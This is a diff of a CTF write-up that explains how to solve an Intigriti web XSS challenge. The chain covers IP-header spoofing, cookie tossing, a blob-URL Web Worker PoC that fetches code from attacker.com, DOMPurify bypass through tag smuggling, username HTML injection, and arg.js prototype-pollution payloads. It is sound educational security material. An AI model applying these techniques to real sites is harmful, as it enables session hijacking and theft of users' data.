@@ -21,13 +21,15 @@ What is the application is About?
 
 * Basically it's a notes application. We can create an account and create notes. The source code is also provided. Which means it's a white box challenge. If you read the source code, you can find that this application's authentication is based on IP + JWT [JSON Web Token].
  * Even if someone has your username and password, they can't access your notes! So, there is no options to share your notes with others! 
+
 ---
+
 Before We Get Started, lets Check the Rules! 
 	<img src="https://i.imgur.com/yTSllvL.png"> 
 * This challenge is based on Firefox 
 *  This challenge is bit different that usual. We don't need to alert `document.domain`, instead we need to alert the note of the victim. 
 * We are allowed to use previous XSS challenges in order to solve this one!
- * Popups are Enables! 
+* Popups are Enables! 
 
 --- 
 
@@ -125,7 +127,7 @@ isAuthed = async (req, res, next) => {
 
 --- 
 
-> ## Theme Page (`/challenge/theme`)
+>## Theme Page (`/challenge/theme`)
 
 ```js
 app.get('/challenge/theme', isAuthed, (req, res) => {
@@ -201,8 +203,12 @@ if (db.users[currentUser].ip !== '127.0.0.1') {
 * Thus, if we somehow manage to spoof the IP while creating an account, then we can create a account with IP *127.0.0.1* and access this page. 
 * The application is using `@supercharge/request-ip` library to get the IP-address! 
 * If you look into the source code of `@supercharge/request-ip` or read their README.md file, you can find a bypass!
- > README file 
+> README file 
+
+
 	<img src="https://i.imgur.com/VVqPyWc.png"> 
+	
+	
 * The application is using the `x-real-ip` header to get the IP of the user
 
 ```js
@@ -218,7 +224,7 @@ for (let  i  in  headers) {
 
  * But the library will check HTTP Headers from the Request Body for IP address at first place in the order mentioned in docs. Because Some Applications maybe Behind Some proxies where the proxies forwarard the read IP of the user via Request Body Headers.
 
-> ## Register / Login Route 
+>## Register / Login Route 
 
 ```js
 app.post('/challenge/auth', (req, res) => {
@@ -273,6 +279,7 @@ app.post('/challenge/auth', (req, res) => {
 
 <img src="https://i.imgur.com/LrU7kgb.png"> 
 
+
 * Yes! We can access the `theme` page now! But sadly we can't use this cookie to create note or anything. Because, every authenticated endpoint other than `/challenge/theme` checks the IP of the user from the request body and verifies if the IP from the request body and IP in the databased are the same. 
 
 ```js
@@ -298,7 +305,7 @@ for (let  i  in  headers) {
 
 --- 
 
-> ## Callbacks in `/challenge/theme` 
+>## Callbacks in `/challenge/theme` 
 
 * The `Theme` page is pretty straight forward after checking the user IP from DB: 
 ```js
@@ -357,7 +364,9 @@ if (req.query.callback) {
 * `backgroundTheme` and `colorTheme` parameters are similar. They need to satisfy this regex `/^[#][0-9a-z]{6}$/`. Which means the length should be 6 chars, must start with `#` and can contain letters and numbers. No Special Characters! 
 
 >### How does the theme functionality work?
- * If the parameters satisfy the regex, then it's passed to `res.render('theme',{theme:{...}})` 
+
+
+* If the parameters satisfy the regex, then it's passed to `res.render('theme',{theme:{...}})` 
 
 * This Application using EJS Template Engine and if you look into the `theme.ejs`, 
 
@@ -391,7 +400,7 @@ function updateTheme() {
 
 * We can call functions with limited arguments from child to opener, but still we need to do something to make sure our cookie works for whole application.Here, We are using the cookies which we created with spoofed IP and every other authenticated endpoints other than `challenge/theme` checks the user ip from the request body and verifies with the ip stored in database! 
 
-> ## Cookie Tossing! 
+>## Cookie Tossing! 
 
 * Cookie Tossing is a kind of attack where we set cookies from `a.test.com` to all subdomains. Like if we set cookie from `a.test.com` with `domain` attribute = `.test.com` or `test.com`, cookies are shared with all subdomains. 
 
@@ -406,7 +415,9 @@ document.cookie = `jwt={cookie_with_spoofed_ip};domain=.intigriti.io;path=/chall
 
 * why `path` attribute? RFC 6265 says, 
 
+
 <img src="https://i.imgur.com/7ihNRtD.png"> 
+
 
 * Got it? ` Cookies with longer paths are listed before cookies with shorter paths.` So, in our case, we are setting cookie with path `/challenge/theme`. So while browser sends the request to `*.intigriti.io/challene/theme`, our spoofed cookie will be sent before the real cookies. So, the Application will still work fine after tossing the cookies! Because, the browser will use the real cookie for other paths! 
 * So, now we can enable the `theme` page for our victim and that means the victim account can access `/challenge/theme` page!
@@ -516,9 +527,12 @@ if (window.saveSecret) {
 * It seems unexploitable, but you can use `WebWorkers` to bypass this check! 
 * What are WebWorkers? 
 > MDN says 
-<img src="https://i.imgur.com/weCttRS.png">
 
- * So, Yaa! There is no window/document object present in `Web Worker` API. So, we can write our own window/document objects there 😎 
+
+	<img src="https://i.imgur.com/weCttRS.png">
+
+
+* So, Yaa! There is no window/document object present in `Web Worker` API. So, we can write our own window/document objects there 😎 
 
 ```js
 // worker.js
@@ -540,7 +554,11 @@ importScripts("https://challenge-1022.intigriti.io/challenge/getSecret.js");
 ```
 
 * That's all? If we try to register a Web Worker, then... 
+
+
 <img src="https://i.imgur.com/0Wt7rhl.png"> 
+
+
 
 * We ran into another issue, we can't register a worker script that lives on cross origin! 
 * Ok, maybe we can try this on our attacker domain and then share the secret with the old xss challenge page in order to perform csrf.
@@ -561,6 +579,8 @@ importScripts("https://challenge-1022.intigriti.io/challenge/getSecret.js");
 
 * If we pass the blob url as URL to `new Worker(BlobURL)`, then the browser is happy to register the worker :) 
 > Example poc: 
+
+
 ```js
 function registerWorker(url) {  
 	const worker = new Worker(url);  
@@ -579,7 +599,7 @@ fetch(`https://attacker.com/worker.js`)
 });
 ```
 
- ## XSS 
+## XSS 
  
 *  We already know how to leak the secret and assuming we have the secret, now we can perform csrf and add another note, then we use `SOME` in `/challenge/theme` to click the second post with DOM navigations. * But there is no xss. Note Title and Note body are sanitized using `DOMPurify` in the latest version. So no XSS. * if we looked at the last part of client-side javascript file - `/app.js`
 ```js
@@ -602,6 +622,8 @@ try{
 * `Object.create(null)` will create a Object with prototype set to `null`. If you don't know about prototype pollution, I had already written a Blog on <a href="https://blog.0xgodson.com/2022-06-03-intigriti-may-chal/">Prototype pollution.</a> 
 * If the document.domain contains `localhost` in it, then Object.whoami.type is set to admin and Object.whoami.markdowm is set to true. Else, Object.whoami.type is set to "normal-user"; 
 * `Object.defineProperty(Object.whoami,'type', {configurable:false,writable:false});` {configurable:false,writable:false} is a method to freeze a property of a object, after assigning values, we can't overwrite. 
+
+
 > Example 
 
 ```
@@ -614,7 +636,7 @@ a.age = 1337;
 console.log(a.age); // still 18
 ```
 
- * Lets look at how the Notes are rendered!
+* Lets look at how the Notes are rendered!
 
 
 ```js
@@ -662,7 +684,10 @@ if (!db.nonces[RequestIp.getClientIp(req)]) {
 
 * Every authenticated page is protected with CSP `scipt-src 'self'`, only `/view/<POST_UUID>` had a CSP with `script-src 'nonce-{not_random_for_sure}'`. So, for XSS we need to upload our javascript file to the server, else we need to somehow leak the nonce and use that on `/view/<post_id>` for xss! 
 * But our input is sanitized with `DOMPurify`, how can we get xss? If we looked into the `view.ejs`, 
+
+
 <img src="https://i.imgur.com/rfaTwJR.png"> 
+
 
 * We can see under some conditions, our note content is passed into another function called `tryMarkDown` which basically looks for `<mk>` in note content and `</mk>` and strip the content between this 2 tags and rendering as markdown. What can go wrong? Our input is already Sanitized by `DOMPurify`, but here under some conditons, our input is parsed again as markdown. 
 * Basically We can do something like mxss. But its not actually MXSS, but some kind of Mxss :) 
@@ -670,10 +695,17 @@ if (!db.nonces[RequestIp.getClientIp(req)]) {
 	* DOMPurify only allow a tag or attribute is DOMPurify knows about it. 
 	* If unknow tags or attributes is present in the string, then those tags/attribute will be removed. 
 	*  so, tags like `<mk>hey</mk>` will be removed by dompurify! 
+
+
 <img src="https://i.imgur.com/XRlfoVM.png">
+
+
 	 * we can smuggle our `<mk>` tags inside know attributes! 
 <img src="https://i.imgur.com/dBQXxo4.png">
+
+
  * By this method, we smuggle our xss payload inside know attributes! Inspired by - https://infosecwriteups.com/clique-writeup-%C3%A5ngstromctf-2022-e7ae871eaa0e 
+
 
 > Example POC:
 
@@ -711,9 +743,14 @@ if(document.querySelectorAll("#usertype")[0].getAttribute("type") === "admin" &&
 * So, we need html element with id=`usertype` and type=`admin` to make this (`document.querySelectorAll("#usertype")[0].getAttribute("type")` === `admin`) true. 
 * Again DOMPurify don't allow `html` element. So, we need some other way. 
 * Every Authenticated Pages carries the Username of the user in `title` tag without **escaping html** 
+
+
 <img src="https://i.imgur.com/HCwhVcR.png"> 
 
+
 * But, the Username is Filtered used a function named `noscript` before rending, 
+
+
 ```js
 function noscript(text) { 
 	matches = text.toLowerCase().match(/(script)|(nonce)|(href)|(getsecret)|(ip-secret)|(form)|(input)|(nonce)/) 
@@ -730,14 +767,22 @@ Edit: Still it is possible to Bypass this with `noscript` with `iframe` srcdoc w
 * If the Username contains any of the above words, then username will not be rendered directly and rendered as `[NO XSS]`. 
 * So, we can use limited HTML in `username`. 
 * If we used a username like `</title><html id=usertype type=admin>random` 
+
+
 <img src="https://i.imgur.com/gH3Ke3c.png"> 
+
+
 
 * we can bypass the first check! to bypass `Object.whoami.type === "admin" && Object.whoami.markdown === true && Object.type === "admin"` we need prototype pollution! Indeed, the application is using arg.js - v1.4 for parsing query string and its vulnerable to prototype pollution! 
 
 * `https://github.com/BlackFan/client-side-prototype-pollution/blob/master/pp/arg-js.md` Here is the vulnerable code and we can also see, BlackFan mentioned few payloads for us and we can try! 
 * If we pass `?constructor[prototype][test]=test` as query string, we can confirm, we have prototype pollution here! <img src="https://i.imgur.com/wxYewpJ.png"> 
 * Now, If we try to pollute / overwrite `Object.whoami.type`, you can't! because, its configured as read only! `Object.defineProperty(Object.whoami,'type', {configurable:false,writable:false});` 
+
+
 <img src="https://i.imgur.com/gikZ4Am.png"> 
+
+
 
 * If you remember, few months back, the one and only legend `gareth heyes` wrote a 
 <a href="https://portswigger.net/research/widespread-prototype-pollution-gadgets">blog</a> on prototype pollution gadgets. 
@@ -745,7 +790,10 @@ Edit: Still it is possible to Bypass this with `noscript` with `iframe` srcdoc w
 	* `ES5 functions such as Object.defineProperty are vulnerable - if a developer does not specify a "value" property, then prototype pollution sources can be used to overwrite properties!` 
 
 * So, If we pollute `Object.prototype.value`, we can overwrite `Object.whoami.type` which is configured read only with `Object.defineProperty`! 
+
+
 <img src="https://i.imgur.com/zjSauHv.png"> 
+
 
 * we also need to set `Object.whoami.markdown` === `true` and `Object.type`===`admin`! We can't write `markdown` inside `Object.whoami` but we can set `Object.prototype.markdown = true`. Since `Object.whoami` is a Object and its prototype is `Object.prototype`. So in prototype chain, we can get `Object.whoami.markdown === true`. To set `Object.type = admin`, we don't want to get into `constructor[prototype]` chain , we can just pollute `Object.type` with `?constructor[type]=admin` :) <img src="https://i.imgur.com/Fdf1beW.png"> 
 
